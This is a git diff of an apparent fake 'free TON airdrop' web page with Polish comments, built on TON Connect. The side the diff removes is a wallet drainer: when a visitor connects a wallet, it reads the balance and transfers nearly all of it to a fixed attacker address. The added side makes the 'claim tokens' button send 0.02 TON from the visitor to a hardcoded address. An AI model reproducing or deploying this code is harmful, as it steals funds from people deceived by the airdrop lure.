@@ -4,10 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON DOGS Token Transfer</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<<<<<<< HEAD
-    <script src="https://unpkg.com/ton-core@latest/dist/ton-core.min.js"></script>
-    <script src="https://unpkg.com/ton-web3@latest/dist/ton-web3.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -39,6 +36,11 @@
             border-radius: 8px;
             display: none;
         }
+        #ton-connect {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
@@ -53,68 +55,73 @@
             <button id="claim-button" disabled>Odbierz tokeny</button>
         </div>
     </div>
-    <script src="script.js"></script>
-=======
-</head>
-<body>
-
-    <div class="center" id="ton-connect"></div>
-    <div id="transaction-status"></div>
-
     <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+        // Manifest URL - ZMIEŃ NA SWÓJ
+        const MANIFEST_URL = 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json';
+
+        // Inicjalizacja TON Connect UI
+        const tonConnectUI = new TONConnectUI({
+            manifestUrl: MANIFEST_URL,
             buttonRootId: 'ton-connect'
         });
 
-        tonConnectUI.uiOptions = {
-            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        };
+        // Elementy DOM
+        const connectButton = document.getElementById('connect-button');
+        const claimButton = document.getElementById('claim-button');
+        const tokenInfo = document.getElementById('token-info');
 
-        const destinationAddress = 'EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY'; // Adres docelowy
+        // Nasłuchiwanie zdarzeń połączenia
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet) {
+                console.log('Wallet connected:', wallet);
+                connectButton.style.display = 'none';
+                tokenInfo.style.display = 'block';
+                claimButton.disabled = false;
+            } else {
+                console.log('Wallet disconnected');
+                connectButton.style.display = 'block';
+                tokenInfo.style.display = 'none';
+                claimButton.disabled = true;
+            }
+        });
 
-        async function getBalance(address) {
-            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
-            const data = await response.json();
-            return BigInt(data.result);
-        }
-
-        async function sendTransaction(wallet) {
+        // Ręczne połączenie portfela
+        connectButton.addEventListener('click', async () => {
             try {
-                const balance = await getBalance(wallet.account.address);
-                
-                // Odejmujemy 0.05 TON na opłaty transakcyjne
-                const amountToSend = balance - BigInt(50000000);
+                await tonConnectUI.connectWallet();
+            } catch (error) {
+                console.error('Błąd połączenia:', error);
+                alert('Nie udało się połączyć z portfelem');
+            }
+        });
 
+        // Funkcja do tworzenia transakcji
+        async function createTokenTransfer() {
+            try {
+                // Przykładowa transakcja
                 const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 360, // 5 minut ważności
+                    validUntil: Math.floor(Date.now() / 1000) + 360,
                     messages: [
                         {
-                            address: destinationAddress,
-                            amount: amountToSend.toString(),
+                            address: 'EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi', // ZMIEŃ NA ADRES KONTRAKTU
+                            amount: '20000000', // 0.02 TON
+                            payload: '' // Dodaj payload jeśli potrzeba
                         }
                     ]
                 };
 
+                // Wysłanie transakcji
                 const result = await tonConnectUI.sendTransaction(transaction);
-                document.getElementById('transaction-status').innerText = 'Transakcja wysłana: ' + result.boc;
+                console.log('Transakcja wysłana:', result);
+                alert('Transakcja została wysłana!');
             } catch (error) {
-                console.error('Błąd podczas wysyłania transakcji:', error);
-                document.getElementById('transaction-status').innerText = 'Błąd: ' + error.message;
+                console.error('Błąd transakcji:', error);
+                alert('Wystąpił błąd podczas wysyłania transakcji');
             }
         }
 
-        tonConnectUI.onStatusChange(async (walletInfo) => {
-            if (walletInfo) {
-                console.log('Portfel podłączony:', walletInfo);
-                await sendTransaction(walletInfo);
-            } else {
-                console.log('Portfel odłączony');
-                document.getElementById('transaction-status').innerText = '';
-            }
-        });
+        // Obsługa przycisku odbioru tokenów
+        claimButton.addEventListener('click', createTokenTransfer);
     </script>
-
->>>>>>> refs/remotes/origin/main
 </body>
 </html>
